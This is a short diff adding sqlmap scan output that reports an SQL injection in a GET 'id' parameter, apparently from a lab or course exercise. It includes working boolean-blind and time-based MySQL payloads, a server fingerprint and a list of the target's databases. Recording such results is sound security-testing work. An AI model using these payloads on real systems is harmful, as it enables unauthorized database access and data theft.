@@ -1,0 +1,23 @@
+sqlmap identified the following injection point(s) with a total of 205 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 7268=7268 AND 'jpAD'='jpAD
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (comment)
+    Payload: id=1' OR SLEEP(5)#
+---
+web server operating system: Linux Ubuntu 16.04 (xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.12
+available databases [7]:
+[*] globitek_blue
+[*] globitek_green
+[*] globitek_red
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+
